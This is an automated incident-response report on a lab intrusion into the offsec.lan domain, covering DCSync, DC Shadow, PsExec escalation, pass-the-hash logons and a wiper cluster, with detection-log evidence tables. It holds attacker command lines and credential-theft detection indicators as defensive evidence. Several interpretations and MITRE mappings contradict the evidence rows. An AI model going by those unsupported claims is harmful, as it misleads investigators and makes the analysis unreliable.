# Tiny T12

**Case ID:** `CASE-7FA5756A`  
**Status:** created · **Severity:** medium  
**Examiner:** system  
**Generated:** 2026-11-11 21:03 UTC  

> Lab IR report from **APPROVED** findings — deterministic evidence tables plus per-section analyst reads.

## Key Takeaways

- **[critical]** CVE-2021-42287 exploitation: Rogue domain controller on rootdc1.offsec.lan (Dec 14)
- **[critical]** Cobalt Strike beacon installed as Windows service on srvdefender01.offsec.lan
- **[critical]** CobaltStrike implant installed as Windows service on srvdefender01.offsec.lan (initial compromise)
- **[critical]** DcSync credential extraction and DC Shadow rogue-DC attack on rootdc1.offsec.lan
- **[critical]** Domain controller compromise: DCSync and DC Shadow attack on rootdc1.offsec.lan
- **[critical]** Domain persistence via CVE-2021-42287 account rename, $-suffixed user, and anti-forensics on rootdc1.offsec.lan/fs03vuln.offsec.lan
- **[critical]** Hermetic Wiper / impact-phase operation on srvdefender01.offsec.lan
- **[critical]** Hermetic Wiper deployment and data redirection on srvdefender01.offsec.lan
- Investigation registered **1** evidence items and **17** approved findings with HMAC chain-of-custody.

## Assessment

_(LLM-assisted theory-building aid — the examiner decides; nothing here is an approved conclusion.)_

**Probable sequence**

1) 2021-04-21T14:56:43Z – Cobalt Strike beacon installed as Windows service 'iOWamcEn' on srvdefend (initial C2 foothold). 2) 2021-04-21T15:01:44Z – secedit /export executed twice on srvdefender01.offsec.lan within 2 s, exfiltrating local security policy (~5 min after beacon install; early discovery). 3) 2021-04-22T08:51:04Z – Pass-the-Hash / Metasploit SMB Type-3 (NETWORK) logons observed; lateral movement begins using stolen hashes. 4) 2021-04-27T11:04:03Z – admmig (non-machine SID) performs AD replication consistent with DcSync on DC, harvesting domain-wide credentials. 5) 2021-12-04T21:19:16Z – PsExec64.exe launched from C:\TOOLS\PsExec64.exe by OFFSEC\admmig (cmd.exe parent, flags -i -s) creating PSEXESVC; second-wave lateral movement via PsExec months after initial compromise. 6) 2021-12-14T14:42:48-49Z – Multi-stage impact culminates in data destruction on affected hosts (endpoint

- **Scope:** Corporate Windows environment with at least srvdefend, srvdefender01.offsec.lan, and one or more DCs; attacker identity tracked as admmig / OFFSEC\admmig; tooling includes Cobalt Strike, Metasploit, PsExec, and native secedit. Activity window 2021-04-21 through 2021-12-14 (~8 months).
- **Confidence:** medium – the actor ID (admmig) and the C2 service are corroborated across clusters #0, #1, #2, and #3, and the 2021-12-14 destruction endpoint is shared by three clusters; however, no cluster covers initial-access vector or explicit C2 beacon-traffic, and the 8-month gap between April tradecraft and the December PsExec/destruction lacks a sustained-persistence cluster.
- **Categories:** `impact`, `credential_access`, `lateral_movement`, `discovery`
- **Gaps:**
  - No cluster documents the initial-access vector (phishing, RDP, exploit) that led to the iOWamcEn service installation – only the install itself is evidenced.
  - No C2 traffic / beacon-communication cluster; the Cobalt Strike connection and callback infrastructure are absent from the provided reads.
  - Eight-month gap (Apr 27 → Dec 4) with no intermediate detection; persistence mechanism (scheduled task, service, WMI, etc.) is not captured in any cluster.
  - secedit /export on srvdefender01.offsec.lan produced a policy file, but no subsequent cluster shows the policy being applied, abused, or exfiltrated – purpose is unconfirmed.
  - Data-destruction mechanism (ransomware dropper, wmic delete, cipher, manual wipe) is not itemised in cluster #0's 12 findings as presented here; the specific ransomware/deletion tooling is unverified.
  - No exfiltration cluster (DNS, HTTPS upload, cloud storage) is present; whether stolen credentials or data left the network is unknown.
- **Recommended next steps:**
  - Pivot on service 'iOWamcEn': pull the full install event, parent process, and binary hash; run check_service and check_hash against baseline to confirm it is not a legitimate vendor update.
  - Enumerate all logon events for admmig / OFFSEC\admmig across the full 8-month window (es_search ecs.user.name + range ts) to identify persistence and intermediate activity not captured in the current clusters.
  - Search for scheduled-task creation, WMI event subscriptions, and service-registry persistence (ecs.registry.path, ecs.process.command_line) on srvdefend and srvdefender01.offsec.lan between 2021-04-27 and 2021-12-04 to close the gap.
  - Pull the 38 rows of cluster #0 and identify the specific data-destruction commands (wmic, certutil, cipher, format, etc.); cross-reference with check_file to confirm no legitimate maintenance tooling.
  - Review secedit /export output paths and check whether the exported .inf was later consumed (secedit /import, or copied to C:\TOOLS\) to confirm the discovery's operational purpose.
  - Query DNS and proxy logs (if in scope) for Cobalt Strike malleable-C2 domains and any bulk-upload patterns to assess exfiltration.

## Examiner questions

- **Q:** What compromise suspected?
  - **A:** Approved findings bearing on this question: F-claudebot-192 (CVE-2021-42287 exploitation: Rogue domain controller on rootdc1.offsec.lan (Dec 14)); F-claudebot-186 (Cobalt Strike beacon installed as Windows service on srvdefender01.offsec.lan); F-claudebot-138 (CobaltStrike implant installed as Windows service on srvdefender01.offsec.lan (initial compromise)); F-claudebot-231 (DcSync credential extraction and DC Shadow rogue-DC attack on rootdc1.offsec.lan); F-claudebot-190 (Domain controller compromise: DCSync and DC Shadow attack on rootdc1.offsec.lan) and 12 more. The conclusion is the examiner's. (`F-claudebot-192`)

## Case Summary

Compromise suspected.

Evidence registry size: **1** items (paths/hashes listed in Evidence Registry).

## Analysts

Analysis and reporting: `system` (DFIR-Nexus automated + HITL).

#### Table of Contents

- Key Takeaways
- Assessment
- Examiner questions
- Case Summary
- Findings
- Timeline
- Indicators
- Detections
- MITRE ATT&CK
- Insider Threat Matrix
- Evidence Registry

## Findings

### Credential Access

#### Correlated signal — 2 needle(s) on one attack chain

Needles `DcSync credential extraction and DC Shadow rogue-DC attack on rootdc1.offsec.lan`, `Domain controller compromise: DCSync and DC Shadow attack on rootdc1.offsec.lan` matched an overlapping hit set — one attack chain, reported once.

- `F-claudebot-231` **DcSync credential extraction and DC Shadow rogue-DC attack on rootdc1.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-190` **Domain controller compromise: DCSync and DC Shadow attack on rootdc1.offsec.lan** (severity: critical, approved by claudebot)
- **Cluster severity:** critical
- **MITRE:** T1003.003, T1003.006, T1098, T1207

**Evidence**

| Time (UTC) | Source | Artifact / path | What it shows | file:line |
|---|---|---|---|---|
| 2021-04-27T11:04:03.497Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Active Directory Replication from Non Machine Account - DcSync Indicator · Level: med · Details: User: admmig ¦ ObjSvr: DS ¦ ObjName: %{0b32719a-29a5-4ad5-b9dc-56200eba0ce0} ¦ OpType: Object Access ¦ HID: 0x0 ¦ LID: 0x31a19b0f | hayabusa/evtx-timeline.csv:182 |
| 2021-04-27T11:04:03.495Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible DC Shadow Attack · Level: med · Details: SPN: HOST/jump01.offsec.lan RestrictedKrbHost/jump01.offsec.lan HOST/JUMP01 RestrictedKrbHost/JUMP01 WSMAN/jump01.offsec.lan WSMAN/jump01 TERMSRV/jump01.offsec.lan TERMSRV/JUMP01 E3514235-4B06-11D1-AB04-00C04FC2DCD2/097b2e16-f2c3-44ef-b300-ec7e11e2a9f2/offsec.lan E3514235-4B06-11D1-AB04-00C04FC2DCD2 | hayabusa/evtx-timeline.csv:183 |
| 2021-04-27T11:04:03.497635Z | hayabusa | chainsaw/sigma.csv | RuleTitle: Active Directory Replication from Non Machine Account - DcSync Indicator | chainsaw/sigma.csv:142 |
| 2021-04-27T11:04:03.502Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible DC Shadow Attack · Level: med · Details: SPN: HOST/jump01.offsec.lan RestrictedKrbHost/jump01.offsec.lan HOST/JUMP01 RestrictedKrbHost/JUMP01 WSMAN/jump01.offsec.lan WSMAN/jump01 TERMSRV/jump01.offsec.lan TERMSRV/JUMP01 E3514235-4B06-11D1-AB04-00C04FC2DCD2/097b2e16-f2c3-44ef-b300-ec7e11e2a9f2/offsec.lan E3514235-4B06-11D1-AB04-00C04FC2DCD2 | hayabusa/evtx-timeline.csv:184 |
| 2021-04-27T11:04:13.291Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: OU=SERVERS · RuleTitle: Possible DC Shadow Attack · Level: med · Details: User: admmig ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1111 ¦ ObjDN: CN=JUMP01 · Level: OU=RESOURCES · Computer: DC=offsec · Channel: DC=lan ¦ AttrLDAPName: servicePrincipalName ¦ OpType: %%14674 ¦ LID: 0x31a24611 | hayabusa/evtx-timeline.csv:185 |
| 2021-04-27T11:04:53.341Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: OU=SERVERS · RuleTitle: Possible DC Shadow Attack · Level: med · Details: User: admmig ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1111 ¦ ObjDN: CN=JUMP01 · Level: OU=RESOURCES · Computer: DC=offsec · Channel: DC=lan ¦ AttrLDAPName: servicePrincipalName ¦ OpType: %%14675 ¦ LID: 0x31a24611 | hayabusa/evtx-timeline.csv:186 |
| 2021-04-27T11:04:03.495868Z | hayabusa | chainsaw/sigma.csv | RuleTitle: Possible DC Shadow Attack | chainsaw/sigma.csv:112 |
| 2021-12-14T14:42:48.817Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Add or Remove Computer from DC · Level: low · Details: Comp: compnay-88$ ¦ CompSID: S-1-5-21-4230534742-2542757381-3142984815-1296 ¦ SrcUser: hack1 ¦ UserSID: S-1-5-21-4230534742-2542757381-3142984815-1234 ¦ LID: 0x308fb82ad | hayabusa/evtx-timeline.csv:220 |
| 2021-12-14T14:42:48.817933Z | hayabusa | chainsaw/sigma.csv | RuleTitle: Add or Remove Computer from DC | chainsaw/sigma.csv:336 |

**Interpretation**

The attacker used a non-machine user account (admmig) to perform DcSync replication against rootdc1.offsec.lan (a DC), extracting domain-wide NTLM hashes. The concurrent DC Shadow operation (adding a GC SPN to a computer object for a different domain offsec.lan) establishes a rogue domain controller capability, enabling persistent golden-ticket forgery. This represents full domain dominance.

**Analyst read** _(LLM-assisted — verify against evidence rows; not examiner-approved)_

- **Category:** `credential_access`
- **What:** admmig (SID S-1-5-21-4230534742-2542757381-3142984815-1111), a non-machine account, performed an AD replication (DS Object Access) consistent with DcSync at 2021-04-27T11:04:03Z (LID 0x31a19b0f). Concurrently, servicePrincipalName modifications were written to CN=JUMP01 (OU=RESOURCES, OFFSEC) injecting SPNs for jump01.offsec.lan (HOST, RestrictedKrbHost, WSMAN, TERMSRV, GUID E3514235-…/097b2e16-…): OpType %%14674 (modify) at 11:04:13Z and %%14675 (add) at 11:04:53Z. Separately, on 2021-12-14T14:42:48Z hack1 (SID S-1-5-21-4230534742-2542757381-3142984815-1234) added computer object 'compnay-88$
- **Why it matters:** DcSync from a regular user account indicates the attacker holds DS-Replication (or DCSync) privileges, allowing extraction of every domain NTLM/LM hash including the KRBTGT account. The DC Shadow SPN injection across domains (offsec.lan SPNs on an OFFSEC computer object) establishes a rogue-DC capability: once the attacker compromises the domain controller's KRBTGT, the injected SPNs allow forging valid TGTs without a full AD replica. The later 'compnay-88$' addition to a DC (T1098) extends persistence and lateral foothold. Together these confirm full domain dominance on OFFSEC with cross-doma
- **How:** Inference: the actor leveraged a privileged user account (admmig) with DS-Replication rights (likely via AD CS, ADCS abuse, or a pre-existing admin compromise) to issue an LDAP replication request (DcSync). The DC Shadow was executed by modifying the servicePrincipalName attribute of CN=JUMP01 to include SPNs for jump01 in offsec.lan, so that when the rogue DC presents itself, AD will issue valid service tickets for those SPNs. The Dec-14 computer-account addition is consistent with registering a new DC ('compnay-88$') to obtain additional replication rights or persistence.
- **Who / when:** admmig (S-1-5-21-4230534742-2542757381-3142984815-1111) on 2021-04-27 11:04:03–11:04:53 UTC; hack1 (S-1-5-21-4230534742-2542757381-3142984815-1234) on 2021-12-14 14:42:48 UTC. Events logged on OFFSEC DCs (channel DC=lan, LID 0x31a…).
- **Verify next:**
  - Query Security/DS-Access logs (4662, 4624) for admmig around 2021-04-27 11:04 to confirm replication scope (domain, GUID) and whether KRBTGT hash was returned.
  - Check AD object CN=JUMP01 (OFFSEC) current servicePrincipalName and whenCreated/whenChanged; cross-reference with offsec.lan jump01 object to confirm cross-domain SPN mismatch.
  - Review the KRBTGT account lastPasswordSet (msDS-PasswordLastSet) to assess golden/silver ticket window; rotate if DcSync succeeded.
  - Search for 'compnay-88$' in both domains: was it a legitimate server? Check its lastLogon, DNS records, and whether it subsequently issued replication requests.
  - Correlate hack1's activity in Dec 2021 with any other computer-account additions or DC role changes (4741, 4741+4738).
- **Caveats:**
  - The DcSync row (HID 0x0) does not name the originating host; attacker/rootdc1.offsec.lan come from the finding title, not the row data. Confirm the source IP via 4624/4662 before attributing to a specific machine.
  - OpType %%14674/%%14675 are LDAP modify/add operations; benign AD admin work (e.g., DNS or service registration) can also alter servicePrincipalName. The cross-domain SPN pattern (offsec.lan entries on an OFFSEC object) is the distinguishing indicator; verify no legitimate cross-domain service dependency exists for jump01.
  - 'compnay-88$' contains a typo ('compnay' vs 'company'); this may be a data-entry artifact in AD and does not by itself indicate malicious intent—corroborate with other activity from that computer account.
  - The DcSync and DC Shadow rows are at Level 'med' and the Add/Remove Computer row at 'low'; confirm whether analyst tuning suppresses higher-severity variants of the same events.

### Discovery

#### SeCEdit privilege abuse on srvdefender01.offsec.lan

- **ID(s):** `F-claudebot-147`
- **Severity:** medium
- **Approved by:** claudebot
- **MITRE:** T1685.001, T1547.001

**Evidence**

| Time (UTC) | Source | Artifact / path | What it shows | file:line |
|---|---|---|---|---|
| 2021-04-21T15:01:44Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potential Suspicious Activity Using SeCEdit · Level: med · Details: Cmdline: C:\Windows\system32\secedit.exe /export /cfg "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf" ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ PID: 4976 ¦ User: SRVDEFENDER01$ | hayabusa/evtx-timeline.csv:326 |
| 2021-04-21T15:01:46Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potential Suspicious Activity Using SeCEdit · Level: med · Details: Cmdline: C:\Windows\system32\secedit.exe /export /mergedpolicy /cfg "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf" ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ PID: 2876 ¦ User: | hayabusa/evtx-timeline.csv:327 |

**Interpretation**

The operator used SeCEdit (analogous to SeDebug) to modify security settings on srvdefender01.offsec.lan shortly after the initial compromise. This privilege is often used to disable auditing or modify security policy to cover tracks.

**Analyst read** _(LLM-assisted — verify against evidence rows; not examiner-approved)_

- **Category:** `discovery`
- **What:** Two secedit.exe /export commands executed 2 seconds apart on srvdefender01.offsec.lan (2021-04-21T15:01:44Z and :46Z) wrote the local security policy and merged-policy to the Microsoft Monitoring Agent's temporary directory (…\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.…). The /export verb indicates a read-only dump of the local security configuration, not a /configure write.
- **Why it matters:** The output path under 'Microsoft Monitoring Agent\…\AzureSecurityPack' matches the Azure Security Pack (MAM/SC agent) routine security-posture collection job, which periodically exports the local security policy for cloud-side scoring. A genuine SeCEdit abuse by an attacker would typically use /configure or /analyze to alter or test the policy, and would write to a location outside the MAM agent tree. The /export-to-agent-path pattern here is consistent with the agent's normal operation rather than adversarial modification.
- **How:** Inference: the MAM/Azure Security Pack agent on srvdefender01.offsec.lan ran its scheduled security-policy export. The hayabusa rule fires on any secedit.exe process creation with a non-default output path, flagging the export as 'Potential Suspicious Activity Using SeCEdit.' No SeCEdit privilege (SeManagePrivilege / SeSecurityDebugPrivilege) grant is visible in these rows; the binary is the stock C:\Windows\system32\secedit.exe. (The MITRE tags T1547.001/T1685.001 attached to the cluster appear mis-assigned; secedit /export is closer to T1069.002 / T1548.001 if attributed to an actor.)
- **Who / when:** Host: srvdefender01.offsec.lan. Process: C:\Windows\system32\secedit.exe (two invocations). Time window: 2021-04-21T15:01:44Z – 15:01:46Z (2 s). No user account field is present in the evidence rows.
- **Verify next:**
  - Check Event ID 4688 / 4697 in the native EDR or WinEvent log around 15:01:44Z to capture the creating process and logon SID that launched secedit.exe; confirm it is the MAM agent (MsftSqm.exe / MSFT_SQM.exe / Agent.exe under C:\Program Files\Microsoft Monitoring Agent\Agent).
  - Run check_file('C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.cfg') to confirm the output path sits under a known MAM installation tree in the Windows baseline.
  - Search es_search for other secedit.exe /configure or /analyze invocations on srvdefender01.offsec.lan in the same time window; absence would further support the benign-export hypothesis.
  - Review the Azure Security Pack / MAM agent job schedule (Task Scheduler or agent logs) to confirm a security-policy export job was due at ~15:01.
- **Caveats:**
  - Both commands are /export (read), not /configure or /analyze (write/modify); the prior interpretation's claim that SeCEdit was 'used to modify security settings' is not supported by the verb in the evidence rows.
  - No user name, logon SID, or parent-process field is present in the two evidence rows, so the acting identity cannot be confirmed from this cluster alone.
  - hayabusa rule 'Potential Suspicious Activity Using SeCEdit' is a low-specificity, medium-level detection that fires on any non-default secedit invocation; it does not distinguish agent-driven exports from attacker-driven ones.
  - The MITRE TTP tags T1547.001 (Syskey) and T1685.001 do not correspond to secedit /export; the cluster's TTP mapping appears to be a heuristic artifact of the detection engine rather than a confirmed technique.

### Lateral Movement

#### Second-wave re-engagement: PsExec execution to LOCAL SYSTEM on fs03vuln.offsec.lan

- **ID(s):** `F-claudebot-191`
- **Severity:** high
- **Approved by:** claudebot
- **MITRE:** T1569.002, T1021.002, T1587.001, T1569

**Evidence**

| Time (UTC) | Source | Artifact / path | What it shows | file:line |
|---|---|---|---|---|
| 2021-12-04T21:19:16Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: technique_name=Service Execution ¦ Cmdline: PsExec64.exe -i -s cmd ¦ Proc: C:\TOOLS\PsExec64.exe ¦ User: OFFSEC\admmig ¦ ParentCmdline: "C:\Windows\system32\cmd.exe" ¦ LID: 0x83ef56 ¦ LGUID: A57649D1-9E9D-61A6-56EF-830000000000 ¦ PID: 2124 ¦ PGUID: A57649D1-DB54-61AB-775C-DC · RuleTitle: Proc Exec (Sysmon Alert) · Level: high · Details: Rule: technique_id=T1035 | hayabusa/evtx-timeline.csv:12 |
| 2021-12-04T21:19:16Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: PsExec/PAExec Escalation to LOCAL SYSTEM · Level: high · Details: Cmdline: PsExec64.exe -i -s cmd ¦ Proc: C:\TOOLS\PsExec64.exe ¦ User: OFFSEC\admmig ¦ ParentCmdline: "C:\Windows\system32\cmd.exe" ¦ LID: 0x83ef56 ¦ LGUID: A57649D1-9E9D-61A6-56EF-830000000000 ¦ PID: 2124 ¦ PGUID: A57649D1-DB54-61AB-775C-DC0100000000 ¦ ParentPID: 532 ¦ ParentPGUID: A57649D1-ACE8-61A | hayabusa/evtx-timeline.csv:18 |
| 2021-12-04T21:19:16Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: PsExec Service Child Process Execution as LOCAL SYSTEM · Level: high · Details: Cmdline: "cmd" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\Windows\PSEXESVC.exe ¦ LID: 0x3e7 ¦ LGUID: A57649D1-92D9-61A4-E703-000000000000 ¦ PID: 540 ¦ PGUID: A57649D1-DB54-61AB-0467-DC0100000000 ¦ ParentPID: 4752 ¦ ParentPGUID: A57649D1-DB54-61AB-2B62-DC01000 | hayabusa/evtx-timeline.csv:19 |
| 2021-12-04T21:19:16Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: technique_name=Command-Line Interface ¦ Cmdline: "cmd" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\Windows\PSEXESVC.exe ¦ LID: 0x3e7 ¦ LGUID: A57649D1-92D9-61A4-E703-000000000000 ¦ PID: 540 ¦ PGUID: A57649D1-DB54-61AB-0467-DC0100000000 · RuleTitle: Proc Exec (Sysmon Alert) · Level: high · Details: Rule: technique_id=T1059 | hayabusa/evtx-timeline.csv:13 |

**Interpretation**

The attacker re-engaged fs03vuln.offsec.lan in December 2021 using PsExec to execute commands as LOCAL SYSTEM. The binary is confirmed malicious by threat-intel (3 YARA rules match). This represents a second wave of activity ~8 months after the initial April compromise, consistent with the same actor (admmig) re-establishing privileged execution on the target.

**Analyst read** _(LLM-assisted — verify against evidence rows; not examiner-approved)_

- **Category:** `lateral_movement`
- **What:** At 2021-12-04T21:19:16Z, PsExec64.exe (C:\TOOLS\PsExec64.exe) was launched by OFFSEC\admmig from a cmd.exe parent with flags -i -s, creating the PSEXESVC service. Immediately after, PSEXESVC.exe (C:\Windows\PSEXESVC.exe) spawned cmd.exe running as NT AUTHORITY\SYSTEM (PID 540, LID 0x3e7, LGUID A57649D1-92D9-61A4-E703-000000000000). All four detection rows (PsExec escalation, service child-process, and CLI detections) share the same timestamp.
- **Why it matters:** Privileged remote command execution as LOCAL SYSTEM is a primary lateral-movement and privilege-escalation primitive (MITRE T1021.002 / T1569.002). The non-standard binary location C:\TOOLS\ and the use of -i -s to force interactive SYSTEM context, combined with the finding title's identification of this as a second-wave re-engagement ~8 months after the initial compromise, indicate an actor re-establishing privileged foothold on the target rather than routine administrative tasking.
- **How:** Inference: The actor (admmig) ran PsExec64.exe from a local cmd.exe session, likely over an SMB/WinRM channel to the target host. PsExec installed PSEXESVC locally (or on the target), which then executed cmd.exe under the SYSTEM token. The -i flag forces an interactive session, and -s requests the local SYSTEM account—both deliberate choices to maximise privilege. The C:\TOOLS\ staging path suggests the binary was pre-positioned or dropped by an earlier phase rather than pulled from a standard share.
- **Who / when:** Account OFFSEC\admmig executed PsExec64.exe; target host identified by LGUID A57649D1-92D9-61A4-E703-000000000000 (fs03vuln.offsec.lan per finding title). All events at 2021-12-04T21:19:16Z. Source/service host LGUID A57649D1-9E9D-61A6-56EF-830000000000.
- **Verify next:**
  - Hash C:\TOOLS\PsExec64.exe and PSEXESVC.exe; compare against Sysinternals signature to confirm or rule out trojanised binary (prior interpretation cites 3 YARA matches—confirm in case notes).
  - Trace the LGUID pair: pull network-connection (445/135) and Logon (4624/4648) events on both LGUIDs at 21:19:16Z to confirm SMB service-install path and source IP.
  - Check admmig's group membership / GPO remote-execution rights at that time to distinguish authorised admin use from unauthorised lateral movement.
  - Enumerate PSEXESVC service creation (4697/4698) and deletion (4698) to confirm the full install→run→cleanup lifecycle and rule out persistence.
  - Correlate with April 2021 initial-compromise IOCs (same actor, same paths) to validate the 'same actor, second wave' hypothesis.
- **Caveats:**
  - PsExec is a legitimate Sysinternals utility; C:\TOOLS\ and -i -s are common in sanctioned change-management, so the binary and flags alone do not prove adversary action.
  - The evidence rows are all at a single second; there is no process-tree or network-connection row in this cluster to independently confirm the source host (attacker) or the SMB channel.
  - The prior-interpretation claim of '3 YARA rules match' is not visible in the four evidence rows; it must be re-verified against the case's YARA-lane run_record before being restated as fact.
  - LGUID node portion ending in 000000000000 is atypical; confirm the host-identifier mapping before attributing these rows to a specific machine.

#### Pass the Hash activity across fs03vuln.offsec.lan, srvdefender01.offsec.lan, fs01.offsec.lan

- **ID(s):** `F-claudebot-145`
- **Severity:** medium
- **Approved by:** claudebot
- **MITRE:** T1550.002

**Evidence**

| Time (UTC) | Source | Artifact / path | What it shows | file:line |
|---|---|---|---|---|
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Pass the Hash Activity 2 · Level: med · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: 0Konuy9q8HtkWeKS ¦ SrcIP: 10.23.123.11 ¦ LID: 0x74872 | hayabusa/evtx-timeline.csv:76 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Metasploit SMB Authentication · Level: high · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: 0Konuy9q8HtkWeKS ¦ SrcIP: 10.23.123.11 ¦ LID: 0x74872 | hayabusa/evtx-timeline.csv:77 |
| 2021-06-10T21:21:26Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Pass the Hash Activity 2 · Level: med · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: - ¦ SrcIP: 10.23.123.11 ¦ LID: 0x5a41984 | hayabusa/evtx-timeline.csv:98 |
| 2021-04-26T08:25:36Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Pass the Hash Activity 2 · Level: med · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: - ¦ SrcIP: 10.23.123.11 ¦ LID: 0x4da321f | hayabusa/evtx-timeline.csv:173 |
| 2021-12-14T14:42:48Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Pass the Hash Activity 2 · Level: med · Details: Type: 3 - NETWORK ¦ TgtUser: hack1 ¦ SrcComp: attacker ¦ SrcIP: 10.23.123.11 ¦ LID: 0x308fabb0c | hayabusa/evtx-timeline.csv:219 |
| 2021-12-12T07:15:56Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Pass the Hash Activity 2 · Level: med · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: ¦ SrcIP: 10.23.123.11 ¦ LID: 0x8723c99 | hayabusa/evtx-timeline.csv:1056 |

**Interpretation**

The operator used Pass the Hash (Type 3 network logons with NTLM) for lateral movement across at least three hosts. The temporal span (April to December 2021) indicates sustained access. The kerberos:: and \sam terms suggest credential harvesting and SAM hive access were also attempted.

**Analyst read** _(LLM-assisted — verify against evidence rows; not examiner-approved)_

- **Category:** `lateral_movement`
- **What:** Five hayabusa rows carry RuleTitle 'Pass the Hash Activity 2' and one carries 'Metasploit SMB Authentication,' all reporting Type 3 (NETWORK) logons. Target users are admmig (rows 1–4, 6) and hack1 (row 5); every row lists SrcIP 10.23.123.11, and SrcComp resolves to 0Konuy9q8HtkWeKS (rows 1–2), attacker (row 5), or is blank/'-' (rows 3, 4, 6). The finding groups these events to three target hosts: fs03vuln.offsec.lan, srvdefender01.offsec.lan, fs01.offsec.lan.
- **Why it matters:** Sustained NTLM pass-the-hash network logons spanning ~8 months (2021-04-22 to 2021-12-14) indicate an attacker harvested credential hashes and repeatedly re-used them for remote authentication, maintaining persistent lateral access. The co-occurring 'Metasploit SMB Authentication' rule on LID 0x74872 (row 2, same timestamp and LID as row 1) suggests tooling-level SMB authentication rather than a user-initiated remote desktop or file-share access.
- **How:** Inference: pre-captured NTLM hashes (likely from earlier credential-dumping on a domain controller or member host) were replayed against SMB/Net-Logon to authenticate as domain users on remote systems, consistent with T1550.002 (Pass the Hash – Domain Account). The single source IP 10.23.123.11 across all rows implies a pivoted egress or a compromised workstation used as the jump point.
- **Who / when:** Accounts: admmig (5 logons), hack1 (1 logon). Source hosts: 0Konuy9q8HtkWeKS, attacker (resolved); 3 logons have no resolved hostname. Target hosts per finding grouping: fs03vuln.offsec.lan, srvdefender01.offsec.lan, fs01.offsec.lan. Time window: 2021-04-22T08:51Z through 2021-12-14T14:42Z.
- **Verify next:**
  - Pull full 4624/4625 event XML for LID 0x74872, 0x5a41984, 0x4da321f, 0x308fabb0c, 0x8723c99 to confirm LogonType 3, Authentication Package (NTLM vs Kerberos), and the actual hostname field.
  - Query ecs.winlog.event_data.SrcComp and ecs.winlog.event_data.SrcIP for the three target hosts (fs03vuln.offsec.lan, srvdefender01.offsec.lan, fs01.offsec.lan) to see if additional Type-3 logons exist outside this cluster.
  - Check whether 10.23.123.11 maps to a known workstation or the SAME host as 0Konuy9q8HtkWeKS / attacker (DNS/GNSI or netflow correlation).
  - Correlate the 'Metasploit SMB Authentication' rule signature with the raw 4624 event to confirm the SMB client string or metadata that triggered the Metasploit heuristic.
  - Review whether hack1's single logon (row 5, 2021-12-14) is isolated or part of a broader campaign against that account.
- **Caveats:**
  - The prior interpretation referenced 'kerberos:: and \sam' terms; these strings do NOT appear in the six evidence rows and are not corroborated here.
  - Three of six rows have SrcComp '-' or blank, so the originating hostname is unresolved; the single IP 10.23.123.11 may be a NAT/pivot address rather than a distinct attacker box.
  - A 'Pass the Hash Activity 2' rule at Level: med can also fire on legitimate administrative tooling (e.g., PsExec, psexec, managed-service NTLM auth); the Metasploit rule on LID 0x74872 raises confidence but does not by itself prove malicious intent.
  - The 8-month span (Apr–Dec 2021) could reflect intermittent operator activity or batch re-use of harvested hashes rather than continuous day-to-day access.

### Impact

#### Correlated signal — 12 needle(s) on one attack chain

Needles `CVE-2021-42287 exploitation: Rogue domain controller on rootdc1.offsec.lan (Dec 14)`, `Cobalt Strike beacon installed as Windows service on srvdefender01.offsec.lan`, `CobaltStrike implant installed as Windows service on srvdefender01.offsec.lan (initial compromise)`, `Domain persistence via CVE-2021-42287 account rename, $-suffixed user, and anti-forensics on rootdc1.offsec.lan/fs03vuln.offsec.lan`, `Hermetic Wiper / impact-phase operation on srvdefender01.offsec.lan`, `Hermetic Wiper deployment and data redirection on srvdefender01.offsec.lan`, `Obfuscated PowerShell execution, log clearing, and Metasploit SMB authentication on fs03vuln.offsec.lan`, `WMI-based lateral movement, Hermetic Wiper data destruction, and admin-share redirection on srvdefender01.offsec.lan`, `Anti-forensics: Security log clearing on fs03vuln.offsec.lan and srvdefender01.offsec.lan`, `Lateral movement to fs03vuln.offsec.lan via Metasploit SMB authentication and Pass-the-Hash`, `Obfuscated PowerShell execution chain on srvdefender01.offsec.lan and fs03vuln.offsec.lan (FromBase64String/GzipStream pipeline)`, `Anti-forensics: Event log clearing on fs03vuln.offsec.lan and srvdefender01.offsec.lan` matched an overlapping hit set — one attack chain, reported once.

